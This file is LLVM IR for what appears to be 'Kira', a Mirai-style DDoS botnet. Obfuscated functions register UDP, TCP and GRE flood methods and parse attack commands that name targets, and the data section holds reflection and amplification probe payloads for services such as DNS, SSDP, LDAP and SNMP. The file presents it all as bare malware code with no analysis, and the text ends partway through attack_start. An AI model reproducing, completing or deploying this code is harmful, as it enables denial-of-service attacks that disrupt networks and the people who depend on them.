; ModuleID = 'host/ir_sub/Kira.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.attack_method = type { void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, i8 }
%struct.attack_target = type { %struct.sockaddr_in, i32, i8 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.attack_option = type { i8*, i8 }
%struct.table_value = type { i8*, i16 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.udphdr = type { i16, i16, i16, i16 }
%union.__CONST_SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.attack_xmas_data = type { i32, i32, i32, i16, i16 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.grehdr = type { i16, i16 }

@methods_len = global i8 0, align 1
@methods = global %struct.attack_method** null, align 8
@attack_ongoing = global [1 x i32] zeroinitializer, align 4
@LOCAL_ADDR = common global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"\0D\0A\0D\0A\00", align 1
@.str.2 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\01\00\01\00", align 1
@.str.3 = private unnamed_addr constant [31 x i8] c"\01\00\00\01\00\00\00\00\00\00\03www\06google\03com\00\00\05\00\01\00", align 1
@.str.4 = private unnamed_addr constant [41 x i8] c"r\FE\1D\13\00\00\00\00\00\00\00\02\00\01\86\A0\00\01\97|\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.5 = private unnamed_addr constant [49 x i8] c"\D9\00\0A\FA\00\00\00\00\00\01\02\90\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\C5\02\04\EC\ECB\EE\92\00", align 1
@.str.6 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.7 = private unnamed_addr constant [61 x i8] c"0:\02\01\030\0F\02\02Ji\02\03\00\FF\E3\04\01\04\02\01\03\04\100\0E\04\00\02\01\00\02\01\00\04\00\04\00\04\000\12\04\00\04\00\A0\0C\02\027\F0\02\01\00\02\01\000\00\00", align 1
@.str.8 = private unnamed_addr constant [8 x i8] c"\00\01\00\02\00\01\00\00", align 1
@.str.9 = private unnamed_addr constant [52 x i8] c"0\84\00\00\00-\02\01\07c\84\00\00\00$\04\00\0A\01\00\0A\01\00\02\01\00\02\01d\01\01\00\87\0BobjectClass0\84\00\00\00\00\00", align 1
@.str.10 = private unnamed_addr constant [54 x i8] c"\02\01\00\06 \00\00\00\00\00\01\00.n\00\00\00\15service:service-agent\00\07 default\00\00\00\00\00", align 1
@.str.11 = private unnamed_addr constant [157 x i8] c"\00\11\223DUfw\00\00\00\00\00\00\00\00\01\10\02\00\00\00\00\00\00\00\00\C0\00\00\00\A4\00\00\00\01\00\00\00\01\00\00\00\98\01\01\00\04\03\00\00$\01\01\00\00\80\01\00\05\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\02\01\00\00\80\01\00\05\80\02\00\01\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\03\00\00$\03\01\00\00\80\01\00\01\80\02\00\02\80\03\00\01\80\04\00\02\80\0B\00\01\00\0C\00\04\00\00\00\01\00", align 1
@.str.12 = private unnamed_addr constant [25 x i8] c"\01\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\10\00", align 1
@.str.13 = private unnamed_addr constant [24 x i8] c"\06\00\FF\07\00\00\00\00\00\00\00\00\00\09 \18\C8\81\008\8E\04\B5\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"SNQUERY: 127.0.0.1:AAAAAA:xsvr\00", align 1
@.str.15 = private unnamed_addr constant [15 x i8] c"8d\C1x\01\B8\9B\CB\8F\00\00\00\00\00\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"\02\00", align 1
@.str.17 = private unnamed_addr constant [31 x i8] c"\1E\00\010\02\FD\A8\E3\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [174 x i8] c"M-SEARCH * HTTP/1.1\0D\0AHOST: 255.255.255.255:1900\0D\0AMAN: \22ssdp:discover\22\0D\0AMX: 1\0D\0AST: urn:dial-multiscreen-org:service:dial:1\0D\0AUSER-AGENT: Google Chrome/60.0.3112.90 Windows\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [47 x i8] c"\00\00\00\00\00\01\00\00\00\00\00\00\09_services\07_dns-sd\04_udp\05local\00\00\0C\00\01\00", align 1
@.str.20 = private unnamed_addr constant [182 x i8] c"xf4\BE\03\00\00\00\00\00\00\00\00\00\01\00\00\02x\BA\85\09TeamSpeak\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0AWindows XP\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\02\00\00\00 \00<\00\00\01\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\08nickname\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00", align 1
@.str.21 = private unnamed_addr constant [163 x i8] c"\05\CA\7F\16\9C\11\F9\89\00\00\00\00\02\9Dt\8BE\AA{\EF\B9\9E\FE\AD\08\19\BA\CFA\E0\16\A22l\F3\CF\F4\8E<D\83\C8\8DQEo\90\95#>\00\97+\1Cq\B2N\C0a\F1\D7o\C5~\F6HR\BF\82j\A2;e\AA\18z\178\C3\81'\C3G\FC\A75\BA\FC\0F\9D\9Dr$\9D\FC\02\17mk\B1-r\C6\E3\17\1C\95\D9i\99W\CE\DD\DF\05\DC\03\94V\04:\14\E5\AD\9A+\140:#\A3%\AD\E8\E69\8A\85*\C6\DF\E5]-\A0/]\9C\D7+$\FB\B0\9C\C2\BA\89\B4\1B\17\A2\B6\00", align 1
@random_hex.hexs = private unnamed_addr constant [256 x i8] c"\00\01\02\03\04\05\06\07\08\09\0A\0B\0C\0D\0E\0F\10\11\12\13\14\15\16\17\18\19\1A\1B\1C\1D\1E\1F !\22#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\5C]^_`abcdefghijklmnopqrstuvwxyz{|}~\7F\80\81\82\83\84\85\86\87\88\89\8A\8B\8C\8D\8E\8F\90\91\92\93\94\95\96\97\98\99\9A\9B\9C\9D\9E\9F\A0\A1\A2\A3\A4\A5\A6\A7\A8\A9\AA\AB\AC\AD\AE\AF\B0\B1\B2\B3\B4\B5\B6\B7\B8\B9\BA\BB\BC\BD\BE\BF\C0\C1\C2\C3\C4\C5\C6\C7\C8\C9\CA\CB\CC\CD\CE\CF\D0\D1\D2\D3\D4\D5\D6\D7\D8\D9\DA\DB\DC\DD\DE\DF\E0\E1\E2\E3\E4\E5\E6\E7\E8\E9\EA\EB\EC\ED\EE\EF\F0\F1\F2\F3\F4\F5\F6\F7\F8\F9\FA\FB\FC\FD\FE\FF", align 16
@hexPayload = global i8* getelementptr inbounds ([1021 x i8], [1021 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [1021 x i8] c"/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A\00", align 1
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@table = common global [41 x %struct.table_value] zeroinitializer, align 16
@table_key = global i32 -1287662771, align 4

; Function Attrs: noinline nounwind uwtable
define signext i8 @attack_init() #0 {
  %1 = alloca i32, align 4
  call void @add_attack(i8 zeroext 0, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpgeneric)
  call void @add_attack(i8 zeroext 1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpvse)
  call void @add_attack(i8 zeroext 4, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udpplain)
  call void @add_attack(i8 zeroext 6, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpxmas)
  call void @add_attack(i8 zeroext 7, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_nudp)
  call void @add_attack(i8 zeroext 2, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpack)
  call void @add_attack(i8 zeroext 3, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_tcpstomp)
  call void @add_attack(i8 zeroext 5, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_std)
  call void @add_attack(i8 zeroext 8, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_gre_ip)
  call void @add_attack(i8 zeroext 9, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_stdhex)
  call void @add_attack(i8 zeroext 10, void (i8, %struct.attack_target*, i8, %struct.attack_option*)* @attack_method_udphex)
  ret i8 1
}

; Function Attrs: noinline nounwind uwtable
define internal void @add_attack(i8 zeroext, void (i8, %struct.attack_target*, i8, %struct.attack_option*)*) #0 {
  %3 = alloca i8, align 1
  %4 = alloca void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, align 8
  %5 = alloca %struct.attack_method*, align 8
  store i8 %0, i8* %3, align 1
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %1, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %6 = call noalias i8* @calloc(i64 1, i64 16) #7
  %7 = bitcast i8* %6 to %struct.attack_method*
  store %struct.attack_method* %7, %struct.attack_method** %5, align 8
  %8 = load i8, i8* %3, align 1
  %9 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %10 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %9, i32 0, i32 1
  store i8 %8, i8* %10, align 8
  %11 = load void (i8, %struct.attack_target*, i8, %struct.attack_option*)*, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %4, align 8
  %12 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %13 = getelementptr inbounds %struct.attack_method, %struct.attack_method* %12, i32 0, i32 0
  store void (i8, %struct.attack_target*, i8, %struct.attack_option*)* %11, void (i8, %struct.attack_target*, i8, %struct.attack_option*)** %13, align 8
  %14 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %15 = bitcast %struct.attack_method** %14 to i8*
  %16 = load i8, i8* @methods_len, align 1
  %17 = zext i8 %16 to i32
  %18 = sub i32 0, 1
  %19 = sub i32 %17, %18
  %20 = add nsw i32 %17, 1
  %21 = sext i32 %19 to i64
  %22 = mul i64 %21, 8
  %23 = call i8* @realloc(i8* %15, i64 %22) #7
  %24 = bitcast i8* %23 to %struct.attack_method**
  store %struct.attack_method** %24, %struct.attack_method*** @methods, align 8
  %25 = load %struct.attack_method*, %struct.attack_method** %5, align 8
  %26 = load %struct.attack_method**, %struct.attack_method*** @methods, align 8
  %27 = load i8, i8* @methods_len, align 1
  %28 = sub i8 %27, 106
  %29 = add i8 %28, 1
  %30 = add i8 %29, 106
  %31 = add i8 %27, 1
  store i8 %30, i8* @methods_len, align 1
  %32 = zext i8 %27 to i64
  %33 = getelementptr inbounds %struct.attack_method*, %struct.attack_method** %26, i64 %32
  store %struct.attack_method* %25, %struct.attack_method** %33, align 8
  ret void
}

; Function Attrs: nounwind
declare noalias i8* @calloc(i64, i64) #1

; Function Attrs: nounwind
declare i8* @realloc(i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_kill_all() #0 {
  %1 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  br label %2

; <label>:2:                                      ; preds = %21, %0
  %3 = load i32, i32* %1, align 4
  %4 = icmp slt i32 %3, 1
  br i1 %4, label %5, label %27

; <label>:5:                                      ; preds = %2
  %6 = load i32, i32* %1, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %7
  %9 = load i32, i32* %8, align 4
  %10 = icmp ne i32 %9, 0
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %5
  %12 = load i32, i32* %1, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %13
  %15 = load i32, i32* %14, align 4
  %16 = call i32 @kill(i32 %15, i32 9) #7
  br label %17

; <label>:17:                                     ; preds = %11, %5
  %18 = load i32, i32* %1, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [1 x i32], [1 x i32]* @attack_ongoing, i64 0, i64 %19
  store i32 0, i32* %20, align 4
  br label %21

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %1, align 4
  %23 = sub i32 %22, 124702610
  %24 = add i32 %23, 1
  %25 = add i32 %24, 124702610
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %1, align 4
  br label %2

; <label>:27:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_parse(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca %struct.attack_option*, align 8
  %12 = alloca i8, align 1
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store %struct.attack_target* null, %struct.attack_target** %10, align 8
  store %struct.attack_option* null, %struct.attack_option** %11, align 8
  %13 = load i32, i32* %4, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 4
  br i1 %15, label %16, label %17

; <label>:16:                                     ; preds = %2
  br label %251

; <label>:17:                                     ; preds = %2
  %18 = load i8*, i8** %3, align 8
  %19 = bitcast i8* %18 to i32*
  %20 = load i32, i32* %19, align 4
  %21 = call i32 @ntohl(i32 %20) #8
  store i32 %21, i32* %6, align 4
  %22 = load i8*, i8** %3, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 4
  store i8* %23, i8** %3, align 8
  %24 = load i32, i32* %4, align 4
  %25 = sext i32 %24 to i64
  %26 = sub i64 %25, 4665746615231863184
  %27 = sub i64 %26, 4
  %28 = add i64 %27, 4665746615231863184
  %29 = sub i64 %25, 4
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %4, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %17
  br label %251

; <label>:34:                                     ; preds = %17
  %35 = load i8*, i8** %3, align 8
  %36 = getelementptr inbounds i8, i8* %35, i32 1
  store i8* %36, i8** %3, align 8
  %37 = load i8, i8* %35, align 1
  store i8 %37, i8* %7, align 1
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = add i64 %39, -8390032649252404062
  %41 = sub i64 %40, 1
  %42 = sub i64 %41, -8390032649252404062
  %43 = sub i64 %39, 1
  %44 = trunc i64 %42 to i32
  store i32 %44, i32* %4, align 4
  %45 = load i32, i32* %4, align 4
  %46 = icmp eq i32 %45, 0
  br i1 %46, label %47, label %48

; <label>:47:                                     ; preds = %34
  br label %251

; <label>:48:                                     ; preds = %34
  %49 = load i8*, i8** %3, align 8
  %50 = getelementptr inbounds i8, i8* %49, i32 1
  store i8* %50, i8** %3, align 8
  %51 = load i8, i8* %49, align 1
  store i8 %51, i8* %8, align 1
  %52 = load i32, i32* %4, align 4
  %53 = sext i32 %52 to i64
  %54 = add i64 %53, 8956689164027334476
  %55 = sub i64 %54, 1
  %56 = sub i64 %55, 8956689164027334476
  %57 = sub i64 %53, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %4, align 4
  %59 = load i8, i8* %8, align 1
  %60 = zext i8 %59 to i32
  %61 = icmp eq i32 %60, 0
  br i1 %61, label %62, label %63

; <label>:62:                                     ; preds = %48
  br label %251

; <label>:63:                                     ; preds = %48
  %64 = load i32, i32* %4, align 4
  %65 = sext i32 %64 to i64
  %66 = load i8, i8* %8, align 1
  %67 = zext i8 %66 to i64
  %68 = mul i64 5, %67
  %69 = icmp ult i64 %65, %68
  br i1 %69, label %70, label %71

; <label>:70:                                     ; preds = %63
  br label %251

; <label>:71:                                     ; preds = %63
  %72 = load i8, i8* %8, align 1
  %73 = zext i8 %72 to i64
  %74 = call noalias i8* @calloc(i64 %73, i64 24) #7
  %75 = bitcast i8* %74 to %struct.attack_target*
  store %struct.attack_target* %75, %struct.attack_target** %10, align 8
  store i32 0, i32* %5, align 4
  br label %76

; <label>:76:                                     ; preds = %126, %71
  %77 = load i32, i32* %5, align 4
  %78 = load i8, i8* %8, align 1
  %79 = zext i8 %78 to i32
  %80 = icmp slt i32 %77, %79
  br i1 %80, label %81, label %132

; <label>:81:                                     ; preds = %76
  %82 = load i8*, i8** %3, align 8
  %83 = bitcast i8* %82 to i32*
  %84 = load i32, i32* %83, align 4
  %85 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %86 = load i32, i32* %5, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 1
  store i32 %84, i32* %89, align 4
  %90 = load i8*, i8** %3, align 8
  %91 = getelementptr inbounds i8, i8* %90, i64 4
  store i8* %91, i8** %3, align 8
  %92 = load i8*, i8** %3, align 8
  %93 = getelementptr inbounds i8, i8* %92, i32 1
  store i8* %93, i8** %3, align 8
  %94 = load i8, i8* %92, align 1
  %95 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %96 = load i32, i32* %5, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %95, i64 %97
  %99 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %98, i32 0, i32 2
  store i8 %94, i8* %99, align 4
  %100 = load i32, i32* %4, align 4
  %101 = sext i32 %100 to i64
  %102 = sub i64 %101, -1239006607781023839
  %103 = sub i64 %102, 5
  %104 = add i64 %103, -1239006607781023839
  %105 = sub i64 %101, 5
  %106 = trunc i64 %104 to i32
  store i32 %106, i32* %4, align 4
  %107 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %107, i64 %109
  %111 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %110, i32 0, i32 0
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %111, i32 0, i32 0
  store i16 2, i16* %112, align 4
  %113 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %114 = load i32, i32* %5, align 4
  %115 = sext i32 %114 to i64
  %116 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %113, i64 %115
  %117 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %116, i32 0, i32 1
  %118 = load i32, i32* %117, align 4
  %119 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %120 = load i32, i32* %5, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %119, i64 %121
  %123 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %122, i32 0, i32 0
  %124 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %123, i32 0, i32 2
  %125 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %124, i32 0, i32 0
  store i32 %118, i32* %125, align 4
  br label %126

; <label>:126:                                    ; preds = %81
  %127 = load i32, i32* %5, align 4
  %128 = sub i32 %127, -315892229
  %129 = add i32 %128, 1
  %130 = add i32 %129, -315892229
  %131 = add nsw i32 %127, 1
  store i32 %130, i32* %5, align 4
  br label %76

; <label>:132:                                    ; preds = %76
  %133 = load i32, i32* %4, align 4
  %134 = sext i32 %133 to i64
  %135 = icmp ult i64 %134, 1
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %132
  br label %251

; <label>:137:                                    ; preds = %132
  %138 = load i8*, i8** %3, align 8
  %139 = getelementptr inbounds i8, i8* %138, i32 1
  store i8* %139, i8** %3, align 8
  %140 = load i8, i8* %138, align 1
  store i8 %140, i8* %9, align 1
  %141 = load i32, i32* %4, align 4
  %142 = sext i32 %141 to i64
  %143 = sub i64 %142, -2959105486030758050
  %144 = sub i64 %143, 1
  %145 = add i64 %144, -2959105486030758050
  %146 = sub i64 %142, 1
  %147 = trunc i64 %145 to i32
  store i32 %147, i32* %4, align 4
  %148 = load i8, i8* %9, align 1
  %149 = zext i8 %148 to i32
  %150 = icmp sgt i32 %149, 0
  br i1 %150, label %151, label %243

; <label>:151:                                    ; preds = %137
  %152 = load i8, i8* %9, align 1
  %153 = zext i8 %152 to i64
  %154 = call noalias i8* @calloc(i64 %153, i64 16) #7
  %155 = bitcast i8* %154 to %struct.attack_option*
  store %struct.attack_option* %155, %struct.attack_option** %11, align 8
  store i32 0, i32* %5, align 4
  br label %156

; <label>:156:                                    ; preds = %236, %151
  %157 = load i32, i32* %5, align 4
  %158 = load i8, i8* %9, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp slt i32 %157, %159
  br i1 %160, label %161, label %242

; <label>:161:                                    ; preds = %156
  %162 = load i32, i32* %4, align 4
  %163 = sext i32 %162 to i64
  %164 = icmp ult i64 %163, 1
  br i1 %164, label %165, label %166

; <label>:165:                                    ; preds = %161
  br label %251

; <label>:166:                                    ; preds = %161
  %167 = load i8*, i8** %3, align 8
  %168 = getelementptr inbounds i8, i8* %167, i32 1
  store i8* %168, i8** %3, align 8
  %169 = load i8, i8* %167, align 1
  %170 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %171 = load i32, i32* %5, align 4
  %172 = sext i32 %171 to i64
  %173 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %170, i64 %172
  %174 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %173, i32 0, i32 1
  store i8 %169, i8* %174, align 8
  %175 = load i32, i32* %4, align 4
  %176 = sext i32 %175 to i64
  %177 = sub i64 0, 1
  %178 = add i64 %176, %177
  %179 = sub i64 %176, 1
  %180 = trunc i64 %178 to i32
  store i32 %180, i32* %4, align 4
  %181 = load i32, i32* %4, align 4
  %182 = sext i32 %181 to i64
  %183 = icmp ult i64 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %166
  br label %251

; <label>:185:                                    ; preds = %166
  %186 = load i8*, i8** %3, align 8
  %187 = getelementptr inbounds i8, i8* %186, i32 1
  store i8* %187, i8** %3, align 8
  %188 = load i8, i8* %186, align 1
  store i8 %188, i8* %12, align 1
  %189 = load i32, i32* %4, align 4
  %190 = sext i32 %189 to i64
  %191 = add i64 %190, 9147822817222959967
  %192 = sub i64 %191, 1
  %193 = sub i64 %192, 9147822817222959967
  %194 = sub i64 %190, 1
  %195 = trunc i64 %193 to i32
  store i32 %195, i32* %4, align 4
  %196 = load i32, i32* %4, align 4
  %197 = load i8, i8* %12, align 1
  %198 = zext i8 %197 to i32
  %199 = icmp slt i32 %196, %198
  br i1 %199, label %200, label %201

; <label>:200:                                    ; preds = %185
  br label %251

; <label>:201:                                    ; preds = %185
  %202 = load i8, i8* %12, align 1
  %203 = zext i8 %202 to i32
  %204 = sub i32 %203, -1573507597
  %205 = add i32 %204, 1
  %206 = add i32 %205, -1573507597
  %207 = add nsw i32 %203, 1
  %208 = sext i32 %206 to i64
  %209 = call noalias i8* @calloc(i64 %208, i64 1) #7
  %210 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %211 = load i32, i32* %5, align 4
  %212 = sext i32 %211 to i64
  %213 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %210, i64 %212
  %214 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %213, i32 0, i32 0
  store i8* %209, i8** %214, align 8
  %215 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %216 = load i32, i32* %5, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %215, i64 %217
  %219 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %218, i32 0, i32 0
  %220 = load i8*, i8** %219, align 8
  %221 = load i8*, i8** %3, align 8
  %222 = load i8, i8* %12, align 1
  %223 = zext i8 %222 to i32
  call void @util_memcpy(i8* %220, i8* %221, i32 %223)
  %224 = load i8, i8* %12, align 1
  %225 = zext i8 %224 to i32
  %226 = load i8*, i8** %3, align 8
  %227 = sext i32 %225 to i64
  %228 = getelementptr inbounds i8, i8* %226, i64 %227
  store i8* %228, i8** %3, align 8
  %229 = load i8, i8* %12, align 1
  %230 = zext i8 %229 to i32
  %231 = load i32, i32* %4, align 4
  %232 = add i32 %231, -1476808777
  %233 = sub i32 %232, %230
  %234 = sub i32 %233, -1476808777
  %235 = sub nsw i32 %231, %230
  store i32 %234, i32* %4, align 4
  br label %236

; <label>:236:                                    ; preds = %201
  %237 = load i32, i32* %5, align 4
  %238 = sub i32 %237, -1419017746
  %239 = add i32 %238, 1
  %240 = add i32 %239, -1419017746
  %241 = add nsw i32 %237, 1
  store i32 %240, i32* %5, align 4
  br label %156

; <label>:242:                                    ; preds = %156
  br label %243

; <label>:243:                                    ; preds = %242, %137
  %244 = call i32* @__errno_location() #8
  store i32 0, i32* %244, align 4
  %245 = load i32, i32* %6, align 4
  %246 = load i8, i8* %7, align 1
  %247 = load i8, i8* %8, align 1
  %248 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %249 = load i8, i8* %9, align 1
  %250 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  call void @attack_start(i32 %245, i8 zeroext %246, i8 zeroext %247, %struct.attack_target* %248, i8 zeroext %249, %struct.attack_option* %250)
  br label %251

; <label>:251:                                    ; preds = %243, %200, %184, %165, %136, %70, %62, %47, %33, %16
  %252 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %253 = icmp ne %struct.attack_target* %252, null
  br i1 %253, label %254, label %257

; <label>:254:                                    ; preds = %251
  %255 = load %struct.attack_target*, %struct.attack_target** %10, align 8
  %256 = bitcast %struct.attack_target* %255 to i8*
  call void @free(i8* %256) #7
  br label %257

; <label>:257:                                    ; preds = %254, %251
  %258 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %259 = icmp ne %struct.attack_option* %258, null
  br i1 %259, label %260, label %264

; <label>:260:                                    ; preds = %257
  %261 = load %struct.attack_option*, %struct.attack_option** %11, align 8
  %262 = load i8, i8* %9, align 1
  %263 = zext i8 %262 to i32
  call void @free_opts(%struct.attack_option* %261, i32 %263)
  br label %264

; <label>:264:                                    ; preds = %260, %257
  ret void
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #2

declare void @util_memcpy(i8*, i8*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #2

; Function Attrs: noinline nounwind uwtable
define void @attack_start(i32, i8 zeroext, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_target*, align 8
  %11 = alloca i8, align 1
  %12 = alloca %struct.attack_option*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i8 %1, i8* %8, align 1
  store i8 %2, i8* %9, align 1
  store %struct.attack_target* %3, %struct.attack_target** %10, align 8
  store i8 %4, i8* %11, align 1
